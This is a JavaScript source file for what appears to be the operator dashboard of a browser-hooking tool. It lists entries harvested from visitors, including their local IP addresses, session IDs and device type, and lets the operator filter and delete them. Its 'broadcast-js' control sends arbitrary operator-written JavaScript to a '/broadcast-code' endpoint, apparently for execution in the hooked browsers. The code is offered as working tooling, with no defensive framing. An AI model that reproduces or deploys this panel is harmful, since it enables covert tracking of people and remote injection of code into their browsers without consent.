let allData = [];

async function fetchData() {
  try {
    const response = await fetch('/data');
    const data = await response.json();
    allData = data;

    updateDashboard(data);
    updateIpDropdown(data);
    renderData(data);
  } catch (err) {
    console.error('Error fetching data:', err);
  }
}

function updateDashboard(data) {
  // Total entries
  document.getElementById('total-entries').textContent = data.length;

  // Unique IPs
  const uniqueIps = new Set();
  data.forEach(entry => {
    const ip = entry.localips ? entry.localips[0] : 'unknown';
    uniqueIps.add(ip);
  });
  document.getElementById('unique-ips').textContent = uniqueIps.size;

  // Mobile vs Desktop
  let mobileCount = 0;
  let desktopCount = 0;
  data.forEach(entry => {
    if (entry.meta.isMobile) {
      mobileCount++;
    } else {
      desktopCount++;
    }
  });
  document.getElementById('mobile-devices').textContent = mobileCount;
  document.getElementById('desktop-devices').textContent = desktopCount;
}

function updateIpDropdown(data) {
  const dropdown = document.getElementById('ip-dropdown');
  dropdown.innerHTML = '<option value="">All IPs</option>';

  const uniqueIps = new Set();
  data.forEach(entry => {
    const ip = entry.localips ? entry.localips[0] : 'unknown';
    uniqueIps.add(ip);
  });

  uniqueIps.forEach(ip => {
    const option = document.createElement('option');
    option.value = ip;
    option.textContent = ip;
    dropdown.appendChild(option);
  });
}

function renderData(data) {
  const container = document.getElementById('data-container');
  container.innerHTML = '';

  const selectedIp = document.getElementById('ip-dropdown').value;

  data.forEach(entry => {
    const ip = entry.localips ? entry.localips[0] : 'unknown';
    if (selectedIp && ip !== selectedIp) {
      return;
    }

    const div = document.createElement('div');
    div.className = 'entry';
    div.innerHTML = `<pre>${JSON.stringify(entry, null, 2)}</pre>`;

    const deleteBtn = document.createElement('button');
    deleteBtn.className = 'delete-btn';
    deleteBtn.textContent = 'Delete';
    deleteBtn.onclick = () => deleteEntry(entry.meta.sessionID);

    div.appendChild(deleteBtn);
    container.appendChild(div);
  });
}

async function deleteEntry(sessionID) {
  try {
    const response = await fetch(`/delete?sessionID=${sessionID}`, {
      method: 'DELETE',
    });
    if (response.ok) {
      fetchData(); // Refresh the data after deletion
    } else {
      console.error('Failed to delete entry:', await response.text());
    }
  } catch (err) {
    console.error('Error deleting entry:', err);
  }
}
document.getElementById("broadcast-js").addEventListener("click", async () => {
    const code = document.getElementById("custom-js").value;
    try {
        const response = await fetch("/broadcast-code", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ code }),  // Must match the BroadcastCodeRequest model
        });
        if (response.ok) {
            alert("code send successfully");
        } else {
            console.error("Broadcast failed:", await response.text());
        }
    } catch (err) {
        console.error("Network error:", err);
    }
});


document.getElementById('filter-btn').addEventListener('click', () => renderData(allData));
document.getElementById('clear-filter-btn').addEventListener('click', () => {
  document.getElementById('ip-dropdown').value = '';
  renderData(allData);
});

fetchData();
setInterval(fetchData, 86400000);
